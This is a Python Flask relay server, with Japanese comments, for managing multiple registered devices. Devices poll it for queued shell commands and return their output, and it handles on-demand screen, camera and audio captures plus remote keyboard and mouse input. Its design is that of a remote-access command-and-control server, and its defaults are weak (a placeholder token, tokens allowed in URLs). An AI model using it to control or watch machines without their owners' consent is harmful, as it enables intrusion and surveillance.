"""
中継ウェブサーバ（Render）

永続デバイスIDで複数端末を管理。メディアはオンデマンド取得のみ。
"""
import os
import time
import uuid
from collections import defaultdict
from threading import Lock

from flask import Flask, jsonify, request

app = Flask(__name__)

AUTH_TOKEN = os.environ.get("RELAY_AUTH_TOKEN", "change-me-to-a-strong-secret")
AGENT_TIMEOUT = int(os.environ.get("RELAY_AGENT_TIMEOUT", "90"))

_lock = Lock()
_devices: dict[str, dict] = {}
_machine_index: dict[str, str] = {}
_pending_commands: dict[str, list] = defaultdict(list)
_pending_fetches: dict[str, list] = defaultdict(list)
_pending_inputs: dict[str, list] = defaultdict(list)
_results: dict[str, dict] = {}
_fetch_results: dict[str, dict] = {}
_media: dict[str, dict] = {}
_remote_active: set[str] = set()


def _check_auth() -> bool:
    token = request.headers.get("X-Auth-Token") or request.args.get("token")
    return token == AUTH_TOKEN


def _touch_device(device_id: str) -> None:
    if device_id in _devices:
        _devices[device_id]["last_seen"] = time.time()
        _devices[device_id]["online"] = True


def _update_online_flags() -> None:
    now = time.time()
    for info in _devices.values():
        info["online"] = (now - info.get("last_seen", 0)) <= AGENT_TIMEOUT


@app.route("/health")
def health():
    return jsonify({"status": "ok"})


@app.route("/api/register", methods=["POST"])
def register():
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    hostname = data.get("hostname", "unknown")
    platform_name = data.get("platform", "unknown")
    device_id = data.get("device_id")
    machine_key = data.get("machine_key", "")

    with _lock:
        _update_online_flags()

        if device_id and device_id in _devices:
            _touch_device(device_id)
            _devices[device_id]["hostname"] = hostname
            _devices[device_id]["platform"] = platform_name
            return jsonify({"device_id": device_id, "registered": False})

        if machine_key and machine_key in _machine_index:
            device_id = _machine_index[machine_key]
            _touch_device(device_id)
            _devices[device_id]["hostname"] = hostname
            _devices[device_id]["platform"] = platform_name
            return jsonify({"device_id": device_id, "registered": False})

        device_id = device_id or str(uuid.uuid4())[:8]
        while device_id in _devices:
            device_id = str(uuid.uuid4())[:8]

        _devices[device_id] = {
            "device_id": device_id,
            "hostname": hostname,
            "platform": platform_name,
            "machine_key": machine_key,
            "registered_at": time.time(),
            "last_seen": time.time(),
            "online": True,
        }
        if machine_key:
            _machine_index[machine_key] = device_id

    return jsonify({"device_id": device_id, "registered": True})


@app.route("/api/poll/<device_id>")
def poll(device_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    with _lock:
        _update_online_flags()
        if device_id not in _devices:
            return jsonify({"error": "device not found"}), 404

        _touch_device(device_id)
        commands = _pending_commands.pop(device_id, [])
        fetches = _pending_fetches.pop(device_id, [])
        inputs = _pending_inputs.pop(device_id, []) if device_id in _remote_active else []

    return jsonify({"commands": commands, "fetches": fetches, "inputs": inputs})


@app.route("/api/output/<device_id>", methods=["POST"])
def output(device_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    cmd_id = data.get("cmd_id")
    if not cmd_id:
        return jsonify({"error": "cmd_id required"}), 400

    with _lock:
        if device_id not in _devices:
            return jsonify({"error": "device not found"}), 404
        _touch_device(device_id)
        _results[cmd_id] = {
            "device_id": device_id,
            "stdout": data.get("stdout", ""),
            "stderr": data.get("stderr", ""),
            "exit_code": data.get("exit_code", -1),
            "completed_at": time.time(),
        }

    return jsonify({"status": "ok"})


@app.route("/api/devices")
def list_devices():
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    with _lock:
        _update_online_flags()
        devices = sorted(
            [
                {
                    "device_id": d["device_id"],
                    "hostname": d["hostname"],
                    "platform": d["platform"],
                    "online": d.get("online", False),
                    "last_seen": d.get("last_seen", 0),
                    "registered_at": d.get("registered_at", 0),
                }
                for d in _devices.values()
            ],
            key=lambda x: (not x["online"], -x["last_seen"]),
        )

    return jsonify({"devices": devices})


@app.route("/api/agents")
def list_agents():
    """後方互換: オンライン端末のみ。"""
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    with _lock:
        _update_online_flags()
        agents = [
            {
                "agent_id": d["device_id"],
                "device_id": d["device_id"],
                "hostname": d["hostname"],
                "platform": d["platform"],
                "last_seen": d["last_seen"],
            }
            for d in _devices.values()
            if d.get("online")
        ]

    return jsonify({"agents": agents})


@app.route("/api/command/<device_id>", methods=["POST"])
def send_command(device_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    command = data.get("command", "").strip()
    if not command:
        return jsonify({"error": "command required"}), 400

    cmd_id = str(uuid.uuid4())[:12]

    with _lock:
        _update_online_flags()
        if device_id not in _devices:
            return jsonify({"error": "device not found"}), 404
        if not _devices[device_id].get("online"):
            return jsonify({"error": "device offline"}), 404

        _pending_commands[device_id].append({"cmd_id": cmd_id, "command": command})

    return jsonify({"cmd_id": cmd_id, "status": "queued"})


@app.route("/api/fetch/<device_id>", methods=["POST"])
def request_fetch(device_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    fetch_type = data.get("type", "").strip()
    if fetch_type not in ("screen", "camera", "audio"):
        return jsonify({"error": "invalid type"}), 400

    fetch_id = str(uuid.uuid4())[:12]

    with _lock:
        _update_online_flags()
        if device_id not in _devices:
            return jsonify({"error": "device not found"}), 404
        if not _devices[device_id].get("online"):
            return jsonify({"error": "device offline"}), 404

        _pending_fetches[device_id].append({"fetch_id": fetch_id, "type": fetch_type})
        _fetch_results[fetch_id] = {"status": "pending", "type": fetch_type, "device_id": device_id}

    return jsonify({"fetch_id": fetch_id, "status": "queued"})


@app.route("/api/fetch/status/<fetch_id>")
def fetch_status(fetch_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    with _lock:
        result = _fetch_results.get(fetch_id, {"status": "unknown"})

    return jsonify(result)


@app.route("/api/fetch/result/<fetch_id>", methods=["POST"])
def fetch_result(fetch_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    with _lock:
        if fetch_id in _fetch_results:
            _fetch_results[fetch_id].update({
                "status": data.get("status", "done"),
                "completed_at": time.time(),
            })

    return jsonify({"status": "ok"})


@app.route("/api/remote/<device_id>/on", methods=["POST"])
def remote_on(device_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    with _lock:
        if device_id not in _devices:
            return jsonify({"error": "device not found"}), 404
        _remote_active.add(device_id)

    return jsonify({"status": "ok"})


@app.route("/api/remote/<device_id>/off", methods=["POST"])
def remote_off(device_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    with _lock:
        _remote_active.discard(device_id)
        _pending_inputs.pop(device_id, None)

    return jsonify({"status": "ok"})


@app.route("/api/result/<cmd_id>")
def get_result(cmd_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    with _lock:
        result = _results.get(cmd_id)

    if not result:
        return jsonify({"status": "pending"})
    return jsonify({"status": "done", **result})


def _media_handler(device_id: str, kind: str, method: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    if method == "POST":
        data = request.get_json(silent=True) or {}
        payload = data.get("data", "")
        if not payload:
            return jsonify({"error": "data required"}), 400
        with _lock:
            if device_id not in _devices:
                return jsonify({"error": "device not found"}), 404
            _touch_device(device_id)
            entry = {"data": payload, "ts": data.get("ts", time.time())}
            if kind == "screen":
                entry["width"] = data.get("width", 1920)
                entry["height"] = data.get("height", 1080)
            _media.setdefault(device_id, {})[kind] = entry
        return jsonify({"status": "ok"})

    with _lock:
        entry = _media.get(device_id, {}).get(kind)
    if not entry:
        return jsonify({"status": "empty"}), 404
    return jsonify({"status": "ok", **entry})


@app.route("/api/media/<device_id>/camera", methods=["GET", "POST"])
def media_camera(device_id: str):
    return _media_handler(device_id, "camera", request.method)


@app.route("/api/media/<device_id>/audio", methods=["GET", "POST"])
def media_audio(device_id: str):
    return _media_handler(device_id, "audio", request.method)


@app.route("/api/media/<device_id>/screen", methods=["GET", "POST"])
def media_screen(device_id: str):
    return _media_handler(device_id, "screen", request.method)


@app.route("/api/input/<device_id>", methods=["POST"])
def remote_input(device_id: str):
    if not _check_auth():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    event = data.get("event")
    if not event:
        return jsonify({"error": "event required"}), 400

    with _lock:
        if device_id not in _devices:
            return jsonify({"error": "device not found"}), 404
        if device_id not in _remote_active:
            return jsonify({"error": "remote session inactive"}), 400
        _pending_inputs[device_id].append(event)
        if len(_pending_inputs[device_id]) > 100:
            _pending_inputs[device_id] = _pending_inputs[device_id][-50:]

    return jsonify({"status": "queued"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port, debug=False)
